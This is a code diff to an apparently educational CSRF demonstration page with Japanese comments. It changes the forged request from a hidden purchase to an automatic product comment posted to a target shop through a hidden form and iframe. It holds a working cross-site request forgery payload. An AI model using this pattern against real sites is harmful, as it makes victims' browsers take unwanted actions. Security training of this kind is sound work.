@@ -35,14 +35,10 @@
         <p><strong>【学習用デバッグ表示】</strong></p>
         <p>ターゲット: <code id="targetBase"></code></p>
         <p>
-          このページはCSRF体験用の罠サイトを模したものです。ボタンをクリックすると、裏側でShopサイト（ターゲット）に対して購入リクエストが送信されます。
+          このページはCSRF体験用の罠サイトを模したものです。ボタンをクリックすると、裏側でShopサイト（ターゲット）に対して「商品へのコメント」が勝手に投稿されます。
         </p>
         <div style="display: none;">
-          <input id="productId" value="1" />
-          <input id="quantity" value="1" />
-          <input id="unitPrice" value="1" />
-          <input id="total" value="" />
-          <input id="note" value="CSRF_attack_gift" />
+          <input id="commentBody" value="この商品は最高です！(CSRF攻撃による自動投稿)" />
         </div>
       </div>
     </div>
@@ -53,19 +49,8 @@
       document.getElementById("targetBase").textContent = TARGET_BASE;
 
       function buildPayload() {
-        const product_id = document.getElementById("productId").value;
-        const quantity = document.getElementById("quantity").value;
-        const unit_price_yen = document.getElementById("unitPrice").value;
-        const total_input = document.getElementById("total").value;
-        const note = document.getElementById("note").value;
-
-        const q = parseInt(quantity, 10);
-        const n = Number.isFinite(q) && q > 0 ? q : 1;
-        const u = Number(unit_price_yen);
-        const auto = Number.isFinite(u) ? u * n : n;
-        const total_yen = total_input === "" ? auto : total_input;
-
-        return { product_id, quantity, unit_price_yen, total_yen, note };
+        const body = document.getElementById("commentBody").value;
+        return { body };
       }
 
       function submitPost() {
@@ -83,7 +68,8 @@
 
         const form = document.createElement("form");
         form.method = "POST";
-        form.action = new URL("/purchase", TARGET_BASE).toString();
+        // 商品ID 1 (Coffee Beans) にコメントを投稿する
+        form.action = new URL("/products/1/comments", TARGET_BASE).toString();
         form.target = iframeName; // 送信先を iframe に指定
 
         Object.entries(payload).forEach(([k, v]) => {
